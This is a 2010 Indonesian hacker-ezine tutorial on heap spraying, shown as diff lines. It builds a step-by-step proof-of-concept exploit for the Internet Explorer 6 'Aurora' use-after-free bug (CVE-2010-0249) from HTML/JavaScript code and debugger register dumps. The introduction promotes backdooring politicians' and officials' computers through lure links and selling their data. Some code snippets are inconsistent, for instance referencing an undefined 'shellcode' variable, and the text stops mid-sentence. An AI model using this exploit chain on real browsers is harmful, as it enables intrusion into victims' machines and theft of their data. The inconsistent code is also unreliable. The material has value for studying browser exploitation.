@@ -1,0 +1,1375 @@
+Kecoak Elektronik Indonesia [ KEI ]
+http://www.kecoak.org
+
+24 Hours A Day, 300/1200 Baud
+Presents...
+
+
+####################################################################
+TOKET - Terbitan Online Kecoak Elektronik
+Defending the classical hackers mind since 1995
+
+Publisher : http://www.kecoak.org
+Contact   : staff@kecoak.org
+####################################################################
+
+Subject   : The So Called Heapspray Technique
+Writer    : -
+Contact   : Screw u assfuck, don't try to find me
+Style     : Unicode Transformation Format (UTF-8)
+
+
+--[1]-- Kecoak Elektronik License
+
+Kecoak Elektronik secara aktif mendukung Blue Ribbon Campaign.
+Kami akan berusaha untuk menerbitkan semua informasi yang kami anggap
+patut diketahui, baik dokumen teks, artikel majalah, atau surat kabar.
+Seluruh kredit akan diberikan kepada sang pengarang.
+
+Kecoak Elektronik tidak bertanggung jawab atas tindakan orang lain.
+Informasi yang disajikan di situs ini adalah untuk tujuan pendidikan
+dan informasionil belaka. Jika anda memutuskan untuk mengejawantahkan
+dalam bentuk apapun informasi yang tersimpan di situs ini, anda
+melakukan atas keputusan sendiri, dan tidak seorangpun selain anda
+bertanggung jawab atas tindakan tersebut.
+
+Dipersilahkan untuk mengambil sebagian atau seluruh dari isi artikel
+yang kami terbitkan dengan tetap mencantumkan kredit atas pengarang
+dan Kecoak Elektronik sebagai penerbit online. Artikel yang dikutip
+atau diambil tidak dapat dipergunakan untuk kepentingan komersil.
+
+
+--[2]-- Introduction
+
+Client Side. Dua buah kata yang kemudian menjadi sangat populer dalam dunia
+security maupun aktivitas online crime jika digabungkan dengan satu kata
+tambahan, Exploitation. Remote exploitation semakin hari semakin berkurang
+popularitasnya karena disebabkan oleh beberapa hal, salah satunya adalah
+semakin sulitnya sistem pertahanan suatu network atau sistem terutama yang
+digunakan untuk keperluan bisnis sehingga proses eksploitasi semakin sulit
+dilakukan. Walaupun tetap saja beberapa pihak masih sangat hobi dan terus
+menerus menemukan cara-cara mutakhir untuk dapat menembus sistem pertahanan
+network atau sistem saat ini. Client ataupun remote exploitation merupakan
+pilihan masing-masing, dan setiap pilihan memiliki resiko serta 'fun'
+tersendiri yang berbeda dari pilihan yang lain.
+
+Target client side exploitation adalah user, dalam hal ini pengguna personal
+computer. Personal computer sendiri saat ini sudah mulai bergeser bukan hanya
+terbatas pada desktop, namun juga meliputi perangkat seperti laptop ataupun
+smart-phone. Yang menjadi target tentu saja data-data personal didalamnya.
+Dalam remote exploitation, seseorang dapat masuk kedalam mesin suatu
+perusahaan dan melihat isi data-data didalamnya, dengan client-side
+exploitation maka seseorang dapat masuk kedalam personal computer pekerja
+suatu perusahaan untuk dapat melihat isi data-data didalamnya.
+
+Dengan semakin berkembangnya dunia internet saat ini, aplikasi social network
+maupun microblogging dapat meningkatkan pengguna internet dunia, termasuk
+indonesia. Kita bisa lihat bahwa saat ini para artis berlomba-lomba memiliki
+akun twitter ataupun facebook, ataupun politisi maupun orang-orang lingkungan
+pemerintah hingga setingkat mentri memiliki akun twitter pribadi yang bisa
+diakses oleh publik. Rasanya tidak sesulit itu menggunakan metode '@' untuk
+memancing seorang pengguna twitter mengunjungi suatu website yang telah
+disamarkan menggunakan 'shorten-link' seperti bit.ly, dan tanpa disadari oleh
+pengguna twitter tersebut dalam website yang dikirimkan sudah diletakan 0day
+exploit untuk menghabisi browser internet yang digunakan oleh target, dan
+dalam sekejap penyerang akan mendapatkan shell target. Atau dengan sedikit
+otomatisasi dan customized payload, komputer pribadi target dapat di-backdoor
+dan diakses oleh penyerang kapanpun dia mau. Dan secara perlahan-lahan,
+penyerang akan meng-eksplorasi seluruh isi personal computer target.
+
+Jika target artis mungkin '.jpeg' atau '.3gp' adalah sasaran utama pencarian,
+namun jika target adalah politisi ataupun pejabat penting dalam pemerintahan
+maupun corporate, maka tentunya akan ada banyak hal menarik yang harganya
+sangat mahal jika ditawarkan pada pihak-pihak tertentu. Mitos? nope. Jika
+masih ada yang berpikir bahwa cerita-cerita seperti ini adalah mitos maka
+itulah salah satu 'public opinion' yang disebarkan agar keberadaan hal-hal
+seperti ini tetap terjaga dan dapat dinikmati oleh segelintir orang saja.
+
+Pada TOKET edisi sebelumnya, G.S pernah menulis tentang eleonore yang
+merupakan salah satu exploit kit dalam dunia online crime (disebut crimeware).
+Banyak sekali aplikasi serupa yang dapat dibeli seharga rata-rata 500 usd,
+bisa kurang atau lebih tergantung kemampuan crimeware tersebut. Dan jika kita
+lihat kode-kode didalamnya, maka ada beberapa tehnik eksploitasi yang
+digunakan. Tehnik-tehnik ini sebetulnya bukan hal baru, banyak sekali security
+profesional yang mengetahui tehnik tersebut, dan bahkan beberapa lahir dari
+pihak profesional maupun akademis, namun ibarat pistol, tergantung siapa dan
+bagaimana memanfaatkannya.
+
+That's all for the intro. Saya lebih suka menunjukan tujuan dari suatu tulisan
+terlebih dahulu sebagai pengantar agar pembaca mendapatkan gambaran mengenai
+sisa isi article, dan juga pembaca tentunya dapat memilih apakah ingin
+meneruskan atau tidak. 
+
+Salah satu tehnik tua dan masih digunakan hingga saat ini dalam hal
+client-side exploitation adalah heap-spray, dan tehnik inilah yang akan kita
+bicarakan hingga akhir artikel. Tentunya dengan disertai beragam contoh nyata
+dan up-to-date untuk menunjukan bahwa tehnik ini masih berlaku hingga saat ini
+(2010).
+
+
+--[2]-- Heap & JavaScript
+
+Browser internet merupakan salah satu aplikasi paling kompleks didunia saat
+ini, terutama dengan perkembangan beragam website yang setiap hari selalu
+berusaha memenuhi keinginan masyarakat dunia untuk ditampilkan dalam bentuk
+yang lebih baik dan lebih menarik. Saat ini browser internet sudah mirip
+seperti sistem operasi, beragam teknologi dimasukan kedalamnya, browser bukan
+lagi terbatas sebagai aplikasi untuk parsing halaman HTML. Dengan semakin
+boomingnya WWW (World Wide Web), teknologi untuk WWW pun semakin maju dan open
+standar dibuat serta dikembangkan oleh berbagai pihak. Salah satu komponen
+penting dalam dunia WWW adalah JavaScript. JavaScript membuat suatu halaman
+website menjadi lebih dinamis dan interaktif. Saat ini hampir semua website
+menggunakan komponen javascript didalamnya, dan sudah bertahun-tahun
+javascript menjadi masalah dalam hal security. Namun ibarat buah simalakama,
+jika javascript dimatikan pada suatu browser internet maka pengguna ibaratnya
+akan kembali ke jaman batu dimana tampilan website sangat jelek dan
+membosankan.
+
+Pembahasan mengenai javascript tentu akan sangat panjang, namun satu hal yang
+perlu dicatat adalah, javascript merupakan 'client-side technology'. Berbeda
+dengan bahasa pemrograman seperti PHP ataupun ASP dimana pemrosesan dilakukan
+oleh webserver dan kemudian hasilnya dikirimkan pada user dalam bentuk
+kode-kode HTML untuk ditampilkan oleh web browser, pada javascript, pemrosesan
+dilakukan oleh komputer user.
+
+Jika suatu website memiliki kode javascript, maka ketika kita membuka website
+tersebut, web browser yang digunakan akan memproses kode-kode javascript untuk
+kemudian ditampilkan hasilnya pada kita. Ambil contoh kode untuk proses
+looping:
+
+x=1;
+while (x<=10000)
+   x = x +1;
+
+Jika potongan kode diatas di implementasikan dalam bentuk PHP, maka pemrosesan
+looping dilakukan menggunakan resource webserver dan hasilnya akan dikirimkan
+kepada user dalam bentuk "x=10000". Namun jika potongan kode diatas diberikan
+dalam bentuk javascript, maka pemrosesan looping akan dilakukan menggunakan
+resource komputer user, dalam hal ini processor dan memory user, untuk
+kemudian ditampilkan dalam bentuk "x=10000" oleh web browser. Ini adalah
+konsep yang pertama.
+
+Konsep yang kedua, teknologi javascript di-implementasikan oleh web
+browser(contoh: internet explorer) sebagai dynamic object. Object-object yang
+dibuat menggunakan javascript akan dialokasikan secara dinamis, yaitu dibuat
+saat dibutuhkan dan dihancurkan saat selesai. Dengan cara inilah web browser
+dapat melakukan management memory terhadap object-object yang dibuat oleh
+javascript secara efisien. Dalam konsep pemrograman low-level, hal ini disebut
+sebagai 'dynamic memory allocation'. 
+
+Suatu aplikasi dapat mengalokasikan memory dibeberapa area, seperti stack dan
+heap. Saya lagi-lagi tidak akan membahas ini, silahkan gooling jika ingin
+mengetahui lebih dalam. Dalam konteks javascript, sebagaimana implementasi
+dynamic memory allocation, maka object-object dalam javascript akan
+dialokasikan pada area heap. Tentu saja tidak semua isi javascript akan
+diperlakukan sebagai object. Implementasi seperti variable akan dimasukan
+kedalam stack seperti implementasi bahasa pemrograman lainnya, namun untuk
+saat ini cukup di-ingat baik-baik bahwa object akan di implementasikan dalam
+bentuk dynamic memory allocation.
+
+
+--[3]-- Heapspray Exploit
+
+Dari beragam literatur yang terdapat di internet, eksploit yang menggunakan
+heap-spray sudah terlihat beredar sejak tahun 2001 (most of the time, the
+knowledge come from underground, remember?). Namun tehnik eksploitasi ini
+mulai mendapatkan perhatian publik dan banyak dibahas sekitar tahun 2005,
+terutama sejak skypher [1] merilis advisories berikut public exploit untuk bug
+MS05-20 [2] pada internet explorer 6. 
+
+Tehnik eksploitasi yang menggunakan heapspray bisa dibilang adalah jalan
+terakhir, sangat mudah diimplementasikan, dan bersifat reliable. Tehnik ini
+bergantung pada beberapa parameter termasuk diantaranya jenis bugs yang
+dimanfaatkan. Tehnik eksploitasi pada umumnya adalah memaksa processor untuk
+menjalankan kode-kode yang diinginkan oleh penyerang. Ketika terdapat bug pada
+aplikasi, beragam metode dapat digunakan agar processor yang menjalankan
+aplikasi tersebut dapat dibelokan untuk menjalankan code-code lain yang
+diinginkan oleh penyerang. Dalam contoh 'classic stack-based buffer-overflow
+exploitation', penyerang akan berusaha mengontrol isi lokasi stack pada
+memory, dan kemudian mentrigger bug agar terjadi kondisi buffer-overflow pada
+stack dan mengarahkan jalan processor pada lokasi stack memory tertentu yang
+dapat di kontrol oleh penyerang. Pada kasus heap-exploitation, maka penyerang
+akan berusaha mengarahkan jalan processor ke lokasi heap memory. 
+
+Ide dari heapspray adalah:
+
+1. membanjiri isi memory heap.
+2. mentrigger bug.
+3. mengarahkan alur processor menuju lokasi memory heap.
+
+Tujuan kita adalah mengarahkan alur processor menuju suatu lokasi block memory
+pada heap, namun kita tidak tahu bagaimana caranya membuat object dialokasikan
+pada memory yang kita inginkan karena sifatnya adalah dynamic allocation. Itu
+sebabnya kita banjiri isi memory heap (menggunakan javascript) dengan ratusan
+atau ribuan data dengan harapan salah satunya akan mengisi lokasi block memory
+yang kita inginkan.
+
+
+--[4]-- Use-after-free Bug
+
+Karena sifatnya yang spesifik, maka cara paling mudah untuk mempelajari tehnik
+heapray adalah langsung pada suatu bug. Pada bug tersebut kita dapat melihat
+kondisi-kondisi dimana heapspray dapat diterapkan, dan nantinya kita akan
+sampai pada suatu tahap dimana implementasi heapspray merupakan aktivitas
+kopi-paste.
+
+Untuk mempersingkat dan mempermudah maka akan dipilih bug CVE-2010-0249, atau
+lebih dikenal sebagai aurora karena eksploit bug ini diklaim merupakan salah
+satu bagian dari "operation aurora" [3]. Bug ini sudah dibahas beberapa kali
+oleh publik, salah satunya dalam paper "Smashing the stack in 2010" [4]. 
+
+Bug CVE-2010-0249 masuk dalam klasifikasi "use-after-free", yaitu jenis bug
+dimana eksekusi akan crash karena aplikasi berusaha mengakses suatu object
+dalam memory yang sudah tidak ada lagi. Public exploit untuk bug ini bisa
+ditemukan pada situs exploit-db.com [5], namun untuk penjelasan mendetail saya
+akan menyederhanakan bentuk exploitnya secara bertahap agar mudah dipahami.
+
+$ cat crash.html 
+
+<html> 
+<script> 
+
+    var event_obj = null;
+
+	function remove(event) {
+		event_obj = document.createEventObject(event);
+		document.getElementById("sp1").innerHTML = "";
+		window.setInterval(b00m,1);
+	}
+
+	function b00m() {
+		event_obj.srcElement;
+	}
+
+</script>
+
+<body>
+   <span id="sp1">
+      <IMG src="aurora.gif" onload="remove(event)" />
+   </span>
+</body> 
+</html>
+
+
+Ketika dokumen HTML diatas dibuka dengan internet explorer 6 yang belum
+dipatch (note: file aurora.gif harus ada, karena alokasi memory akan dilakukan
+untuk file tersebut), maka rendering engine pada internet explorer akan
+memparsing bagian <script> dimana variable event_obj didefinisikan sebagai
+null, variable ini nantinya dapat menunjuk suatu lokasi object pada memory,
+
+var event_obj = null;
+
+Kemudian eksekusi akan menuju bagian,
+
+<body>
+   <span id="sp1">
+      <IMG src="aurora.gif" onload="remove(event)" />
+   </span>
+</body> 
+</html>
+
+internet explorer akan melihat tag <span> dengan id="sp1", dan didalamnya
+terdapat tag <IMG>. tag <IMG> tersebut akan membuat internet explorer
+mendownload file "auora.gif" dari webserver yang dinyatakan sebagai suatu
+image. Rendering engine pada internet explorer akan mempersiapkan lokasi heap
+pada memory untuk me-load image tersebut. Tag <IMG> memiliki parameter lain,
+yaitu "onload". Parameter tersebut akan dieksekusi ketika  internet explorer
+me-load file image kedalam memory. Parameter onload akan menjalankan fungsi
+"remove(event)", fungsi ini didefinisikan oleh javascript. Oleh karena itu,
+ketika proses load "aurora.gif" dilakukan maka fungsi "remove(event)" juga
+akan di laksanakan.
+
+Berikut ini adalah isi dari fungsi "Remove(event)",
+
+
+function remove(event) {
+	event_obj = document.createEventObject(event);
+	document.getElementById("sp1").innerHTML = "";
+	window.setInterval(b00m,1);
+}
+
+pada bagian "event_obj = document.createEventObject(event);", variabel
+event_obj akan mereferensikan lokasi object event ketika fungsi dipanggil,
+dengan kata lain adalah mereferensikan object tag <IMG> ketika "aurora.gif"
+diload. Selanjutnya,
+
+document.getElementById("sp1").innerHTML = "";
+
+innerHTML digunakan untuk mengganti element apapun yang berada didalam tag
+<span id="sp1">, dengan menggunakan javascript kita dapat mengganti element
+HTML yang akan ditampilkan oleh web browser secara dinamis dengan tag element
+yang lain. Namun metode diatas secara tidak langsung akan menghapus tag <IMG>,
+yang berarti menghapus object <IMG> dari memory.
+
+Eksekusi selanjutnya akan dibawa pada fungsi b00m() melalui metode call
+seperti berikuti ini,
+
+window.setInterval(b00m,1);
+
+kode diatas akan memanggil fungsi b00m() dalam interval 1 milisecond, apa yang
+terjadi ketika fungsi b00m() dipanggil?berikut ini isi fungsi tersebut,
+
+function b00m() {
+	event_obj.srcElement;
+}
+
+fungsi b00m() akan menggunakan variable event_obj untuk me-load tag <IMG>
+melalui metode ".srcElement", sebagaimana kita ketahui bahwa pada
+remove(event) sebelumnya variable event_obj mereferensikan lokasi element tag
+<IMG> pada memory, dan dengan menggunakan
+"document.getElementById("sp1").innerHTML = "";" object tersebut telah
+dihapus, sehingga pada tahap ini bug "use-after-free" di-trigger. Yaitu
+eksekusi terhadap suatu object yang sebelumnya telah dihapus, dan proses ini
+akan mentrigger error.
+
+Jika internet explorer di-attach pada debugger, ketika error tersebut terjadi
+akan muncul seperti dalam bug MS05-020 yang di tuliskan oleh skypher, 
+
+R6025: "Pure Virtual Function Call"
+
+Deskripsi dari Microsoft [6] mengenai error tersebut antara lain,
+
+"This error occurs when your application indirectly calls a pure virtual
+member function in a context where a call to the function is not valid. In
+most cases, the compiler detects this and reports the error when building the
+application. But depending on how your code is written, sometimes the problem
+is detected only at run-time. "
+
+Pada referensi microsoft diberikan contoh constructor dan destructor yang
+dapat men-trigger error ini. Pada intinya adalah "call to the function is not
+valid".
+
+
+--[4]-- Controlling the EIP
+
+Dengan internet exploiter [7], skypher menunjukan bagaimana bug pada browser
+internet explorer dapat di eksploitasi. Heap exploitation sebelumnya telah
+banyak bermunculan terutama ketika perlindungan terhadap stack ditemukan,
+namun metode heap-spray dianggap tehnik paling tepat bagi browser internet.
+Hal ini disebabkan implementasi terhadap spesifikasi browser internet saat itu
+sama antar beberapa vendor, sehingga metode ini yang awalnya muncul ke publik
+untuk eksploitasi bug internet explorer belakangan digunakan untuk eksploitasi
+browser lain seperti mozilla firefox. Bahkan saat ini digunakan juga sebagai
+dasar eksploitasi heapspray untuk aplikasi lain yang menggunakan javascript
+seperti adobe acrobat reader.
+
+Setelah melihat bug dan bagaimana error dapat di-trigger, maka selanjutnya
+adalah metode mengontrol processor agar berjalan menuju kode-kode yang kita
+inginkan. Potongan kode berikut ini dapat digunakan untuk melihat bagaimana
+kita bisa melakukan hal tersebut,
+
+$ cat crash.html 
+
+<html> 
+<script> 
+
+    var obj, event_obj;
+
+	function initialize() {	
+		obj = new Array();
+		event_obj = null;
+		for (var i = 0; i < 200; i++)
+			obj[i] = document.createElement("COMMENT");
+	}
+	
+	function remove(event) {
+		event_obj = document.createEventObject(event);
+		document.getElementById("sp1").innerHTML = "";
+		window.setInterval(b00m,1);
+	}
+
+	function b00m() {
+		var data, overwrite_eip;
+		
+		data = "";
+		overwrite_eip = "\uAAAA\uAAAA";
+		for (var i=0; i< 4; i++)
+			data += overwrite_eip;
+		for (i=0; i < obj.length; i++)
+			obj[i].data = data;
+			
+		event_obj.srcElement;
+	}
+
+	initialize();
+
+
+</script>
+
+<body>
+   <span id="sp1">
+      <IMG src="aurora.gif" onload="remove(event)" />
+   </span>
+</body> 
+</html>
+
+Ada beberapa tambahan kode pada crash.html diatas. Pada saat dieksekusi oleh
+browser, maka akan dijalankan fungsi "initialize()". Berikut ini fungsi
+initialize(),
+
+function initialize() {	
+	obj = new Array();
+	event_obj = null;
+	for (var i = 0; i < 200; i++)
+		obj[i] = document.createElement("COMMENT");
+}
+
+Fungsi ini akan mendefinisikan suatu variable "obj" untuk menampung tipe data
+array, yang kemudian disusul dengan meng-initialize variable "event_obj"
+dengan nilai null sebagaimana telah dibahas sebelumnya. Selanjutnya fungsi
+"initialize()" akan membuat 200 object yang merupakan element "COMMENT" dalam
+HTML. Ke-200 object tersebut akan dimasukan dalam deretan array yang dihandle
+oleh variable "obj". Pada tahap ini, sebagaimana dijelaskan sebelumnya bahwa
+JavaScript akan mengalokasikan object di lokasi heap memory maka pembuatan 200
+object ini juga akan dialokasikan pada heap memory. 
+
+Mungkin ada yang bertanya-tanya kenapa harus 200 object dalam array?dan kenapa
+harus element COMMENT?jawabannya bisa bervariasi. Yang perlu diperhatikan
+adalah kata "0day" dan "found in the wild". Eksploit aurora ditemukan sebagai
+0day exploit yang secara aktif digunakan oleh pihak tertentu untuk
+meng-eksploitasi beragam perusahaan dalam "operation aurora", dan tipikal 0day
+exploit yang ditemukan aktif di internet adalah bug serta metode bagaimana
+mentrigger serta mengontrol bug sudah ada sehingga para researcher hanya
+menganalisis bagaimana bug tersebut bisa terjadi untuk kemudian dibuat
+patch-nya. Proses penemuan 0day ini tentunya balik lagi ke pembuat 0day
+tersebut, dan umumnya menggunakan beragam metode seperti fuzzing ataupun
+source code analysis menggunakan metode reverse engineering.
+
+Metode penemuan bug tentunya diluar scope kita saat ini, namun satu hal yang
+pasti adalah "call flow" diatas dapat digunakan untuk mengontrol eksekusi
+processor sebagaimana yang akan kita lihat dan buktikan.
+
+Eksekusi selanjutnya akan masuk ke fungsi "remove(event)", dan didalamnya akan
+di-eksekusi fungsi b00m(). Namun kali ini ada yang berbeda dalam fungsi
+b00m(),
+
+function b00m() {
+	var data, shellcode;
+	
+	data = "";
+	shellcode = "\uAAAA\uAAAA";
+	for (var i=0; i< 4; i++)
+		data += overwrite_eip;
+	for (i=0; i < obj.length; i++)
+		obj[i].data = data;
+		
+	event_obj.srcElement;
+}
+
+Pada kode sebelumnya fungsi b00m() akan langsung mengeksekusi
+"event_obj.srcElement" yang men-trigger error, namun kali ini sebelum
+mengeksekusi bagian tersebut terlebih dahulu dilakukan beberapa hal. Perlu
+di-ingat bahwa bagian ini spesifik untuk bug aurora (CVE-2010-0249). Bagian
+inilah yang akan digunakan untuk mengontrol alur processor setelah bug
+"use-after-free" di trigger. 
+
+data = "";
+overwrite_eip = "\uAAAA\uAAAA";
+for (var i=0; i< 4; i++)
+	data += overwrite_eip;
+	
+Potongan kode diatas pada intinya adalah hendak mengisi variable "data" dengan
+nilai,
+
+# 8 * \uAAAA
+\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA
+
+Dan pada potongan kode berikutnya akan dijalankan,
+
+for (i=0; i < obj.length; i++)
+	obj[i].data = data;
+	
+Variable "obj" sebelumnya telah di-inisialisasi untuk mengacu pada 200 object
+element COMMENT, dan pada bagian ini nilai atau isi setiap element COMMENT
+akan di-isi dengan "8 * \uAAAA", atau "AAAAAAAAAAAAAAAA".
+
+Apa yang sebenarnya terjadi disini?ini adalah metode untuk meng-overwrite isi
+heap memory. Sebagaimana yang telah kita bahas sebelumnya bahwa pada fungsi
+"remove(event)" object tag <IMG> telah dihapus, dan dalam heap alokasi memory
+untuk <IMG> tersebut berarti dapat digunakan oleh object yang lain. Tujuan
+kita adalah memasukan karakter "AAAA" kedalam heap memory komputer target
+melalui browser internet, dan berharap agar karakter "AAAA" tersebut
+meng-overwrite lokasi heap yang sebelumnya digunakan oleh tag <IMG>. 
+
+Setiap aplikasi yang dijadikan target umumnya memiliki spesifikasi tertentu
+untuk format data input dan ada beberapa karakter yang tidak diperbolehkan
+sebagai data input. Untuk browser internet, format data input ini dalam bentuk
+Unicode. Mengenai implementasi unicode dan javascript secara singkat bisa
+mengacu pada link berikut ini [8]. 
+
+Yang kemudian menjadi pertanyaan adalah mengapa harus "8 * \uAAAA"?Ini
+lagi-lagi kembali pada hasil fuzzing dan analysis. Kita akan mencoba proses
+analysis dan debugging dengan mengganti jumlah "AAAA" diatas,
+
+function b00m() {
+	var data;
+	
+	data = "\uAAAA";
+
+	for (i=0; i < obj.length; i++)
+		obj[i].data = data;
+		
+	event_obj.srcElement;
+} 
+
+Jika fungsi b00m() diatas dieksekusi, maka berikut ini kondisi processor dan
+register ketika crash terjadi,
+
+7DC98C83   8B01             MOV EAX,DWORD PTR DS:[ECX]
+7DC98C85   FF50 34          CALL DWORD PTR DS:[EAX+34]
+7DC98C88   8B40 0C          MOV EAX,DWORD PTR DS:[EAX+C]
+Access violation when reading [00000002]
+ECX = 00000002
+
+Access violation terjadi karena pada 7DC98C83 processor hendak mengakses
+lokasi memory yang direferensikan oleh ECX, dan saat itu EXC bernilai
+"00000002". Opcode yang memasukan nilai tersebut ke ECX terletak pada eksekusi
+sebelumnya, dan bisa kita lihat melalui debugger. Namun untuk saat ini fokus
+kita adalah melihat berapa jumlah karakter "A" yang dibutuhkan untuk
+mengontrol nilai ECX.
+
+function b00m() {
+	var data;
+	
+	data = "\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA";
+
+	for (i=0; i < obj.length; i++)
+		obj[i].data = data;
+		
+	event_obj.srcElement;
+}
+
+Sekarang kita akan melihat dengan "7 * \uAAAA",
+
+7DC98C83   8B01             MOV EAX,DWORD PTR DS:[ECX]
+7DC98C85   FF50 34          CALL DWORD PTR DS:[EAX+34]
+7DC98C88   8B40 0C          MOV EAX,DWORD PTR DS:[EAX+C]
+Access violation when reading [00000002]
+ECX = 0000AAAA
+
+Terlihat jelas bahwa dengan menggunakan "7 * \uAAAA" kita dapat meng-overwrite
+nilai CX, yaitu 16 bit-low dari register ECX. Pada tahap ini tentunya kita
+dapat lebih yakin bahwa "8 * \uAAAA" dapat digunakan untuk meng-overwrite
+register ECX secara utuh.
+
+7DC98C83   8B01             MOV EAX,DWORD PTR DS:[ECX]
+7DC98C85   FF50 34          CALL DWORD PTR DS:[EAX+34]
+7DC98C88   8B40 0C          MOV EAX,DWORD PTR DS:[EAX+C]
+Access violation when reading [00000002]
+EBX = AAAAAAAA
+ECX = AAAAAAAA
+
+Dengan "8 * \uAAAA" kita bukan saja meng-overwrite register ECX, tapi juga
+meng-overwrite EBX. Namun karena error terjadi pada 7DC98C83 dimana referensi
+dilakukan terhadap isi nilai ECX, maka kita bisa mengabaikan register EBX.
+
+Kita sampai pada tahap dimana EIP dapat di-kontrol. Pertanyaan selanjutnya
+adalah nilai apa yang akan diberikan untuk EIP? Trik dari heapspray adalah
+membanjiri isi heap dengan deretan opcode yang jika dijalankan oleh processor
+maka berarti "NOP", dan ketika bug di-trigger maka alur processor dapat
+diarahkan ke lokasi heap tersebut. Jadi tugas kita adalah mengarahkan alur
+processor menuju lokasi memory yang berada dalam kawasan heap, namun jika
+dieksekusi akan berarti "NOP". Diketahui ada beberapa opcode yang dapat
+digunakan, diantaranya "\x0a0a0a0a" dan "\x0c0d0c0d". Pemilihan opcode yang
+kemudian dijadikan "NOPsled" tersebut tergantung pada register mana yang bisa
+kita kontrol. Untuk contoh bug aurora berikut ini state dari register ketika
+access violation terjadi,
+
+7DC98C83   8B01             MOV EAX,DWORD PTR DS:[ECX]
+7DC98C85   FF50 34          CALL DWORD PTR DS:[EAX+34]
+
+Jika kita dapat mengontrol register ECX, dan dapat mengontrol isi dari lokasi
+memory yang di referensikan oleh ECX, maka isi dari lokasi memory tersebut
+akan dimasukan kedalam EAX. Dan processor akan mengesekusi lokasi memory yang
+ditunjuk oleh EAX+34.
+
+Dengan melihat state dari register ketika access violation terjadi, maka nilai
+EAX akan bernilai tetap, sehingga pemilihan "\x0a0a0a0a" akan cukup mudah.
+
+Modifikasi fungsi b00m() berikut ini akan membuat crash.html sebelumnya
+meng-overwrite ECX dengan nilai "0a0a0a0a",
+
+
+function b00m() {
+	var data, overwrite_eip;
+	
+	data = "";
+	overwrite_eip = unescape("%u0a0a%u0a0a")
+	for (var i=0; i< 4; i++)
+		data += overwrite_eip;
+	for (i=0; i < obj.length; i++)
+		obj[i].data = data;
+		
+	event_obj.srcElement;
+}
+
+Access violation akan terjadi dengan kondisi seperti berikut,
+
+7DC98C83   8B01             MOV EAX,DWORD PTR DS:[ECX]
+Access violation when reading [0A0A0A0A]
+
+EAX 00E592B0
+ECX 0A0A0A0A
+EDX 00E50480
+EBX 0A0A0A0A
+ESP 0013E35C
+EBP 0013E37C
+ESI 00E597C0 
+EDI FFFFFFFF
+EIP 7DC98C83 mshtml.7DC98C83
+
+Kita telah berhasil mengontrol ECX dengan nilai 0a0a0a0a, namun ketika nilai
+dari lokasi memory [0a0a0a0a] akan dikopi pada EAX terjadi access violation.
+Pada saat ini isi lokasi memory tersebut tidak valid. Bagaimana cara agar
+membuat lokasi tersebut valid adalah inti dari tehnik heapspray.
+
+
+--[4]-- Spraying the Heap
+
+Berikut ini bentuk dari "crash.html" dengan tambahan fungsi "heap_spray()",
+
+<html> 
+<script> 
+
+    var obj, event_obj;
+
+	function initialize() {	
+		obj = new Array();
+		event_obj = null;
+		for (var i = 0; i < 200; i++)
+			obj[i] = document.createElement("COMMENT");
+	}
+	
+	function heap_spray() {
+		var chunk_size, payload, nopsled;
+		
+		chunk_size = 0x80000;
+		payload = unescape("%uCCCC%uCCCC")
+		nopsled = unescape("%u0a0a%u0a0a");
+		
+		while (nopsled.length < chunk_size)
+			nopsled += nopsled;
+		nopsled_len = chunk_size - (payload.length + 20);
+		nopsled = nopsled.substring(0, nopsled_len);
+		
+		heap_chunks = new Array();
+		for (var i = 0; i < 200; i++)
+			heap_chunks[i] = nopsled + payload;
+	}
+	
+	function remove(event) {
+		event_obj = document.createEventObject(event);
+		document.getElementById("sp1").innerHTML = "";
+		window.setInterval(b00m,1);
+	}
+
+	function b00m() {
+		var data, overwrite_eip;
+		
+		data = "";
+		overwrite_eip = unescape("%u0a0a%u0a0a")
+		for (var i=0; i< 4; i++)
+			data += shellcode;
+		for (i=0; i < obj.length; i++)
+			obj[i].data = data;
+			
+		event_obj.srcElement;
+	}
+
+	initialize();
+	heap_spray();
+
+
+</script>
+
+<body>
+   <span id="sp1">
+      <IMG src="aurora.gif" onload="remove(event)" />
+   </span>
+</body> 
+</html>
+
+fungsi "heap_spray()" akan di jalankan setelah fungsi "initialize()", dan
+wajib dijalankan sebelum bug di-trigger karena fungsi "heap_spray()" akan
+mempersiapkan memory heap yang menjadi tujuan dari eksekusi processor sesaat
+setelah EIP di-overwrite.
+
+function heap_spray() {
+	var chunk_size, payload, nopsled;
+	
+	chunk_size = 0x80000;
+	payload = unescape("%uCCCC%uCCCC")
+	nopsled = unescape("%u0a0a%u0a0a");
+	
+	while (nopsled.length < chunk_size)
+		nopsled += nopsled;
+	nopsled_len = chunk_size - (payload.length + 20);
+	nopsled = nopsled.substring(0, nopsled_len);
+	
+	heap_chunks = new Array();
+	for (var i = 0; i < 200; i++)
+		heap_chunks[i] = nopsled + payload;
+}
+
+Ketika membicarakan heap, maka terdapat beberapa hal tambahan yang harus kita
+ketahui. 
+
+1. Memory heap di bangun oleh blok data, dan ini biasa disebut sebagai
+"chunk". Terdapat beberapa research mengenai berapa besar satu blok memory
+heap yang sebaiknya digunakan pada target browser, ada yang menggunakan
+0x80000, ada pula yang menggunakan 0x40000. Namun menurut saya pada dasarnya
+tergantung oleh jenis bug yang akan di-eksploitasi dan kondisi saat bug
+tersebut di trigger. Untuk kali ini target adalah internet explorer 6, dan
+menurut beberapa research ukurana chunk yang tepat adalah 0x80000.
+
+2. Tidak semua hal dalam javascript di-alokasikan pada memory heap.
+
+
+var str = "AAAA"; akan dialokasikan pada stack
+var obj_str = str.substring(0, 4); akan dialokasikan pada heap
+
+Fungsi "heap_spray()" diatas akan membuat satu chunk besar berukuran 0x80000 (
+512 KB ). Satu chunk tersebut akan berisi nopsled+payload. Nopsled merupakan
+kumpulan \x0a0a yang harus ada pada lokasi memory 0A0A0A0A. Selanjutnya akan
+di alokasikan secara dinamis sebanyak 200 chunk, dan kita berharap agar salah
+satu chunk ditempatkan pada lokasi memory 0A0A0A0A. Inilah yang dimaksud
+dengan tehnik heapspray tidak sepenuhnya reliable.
+
+Total alokasi bisa berbeda-beda tergantung pada jenis bug yang hendak di
+eksploit, jenis aplikasi, jenis sistem operasi, dsb. Untuk saat ini, 200 chunk
+berarti 200 * 512 KB, sehingga total alokasi heapspray adalah 102,400 KB.
+Dengan kata lain kita melakukan heapspray yang memakan sebesar ~ 102 MB dari
+memory target. Saya menggunakan contoh internet explorer 6 yang berjalan
+diatas virtual mesin sitem operasi windows xp sp 2, dan alokasi ini cukup
+stabil.
+
+Berikut ini yang terjadi ketika crash.html diatas dieksekusi,
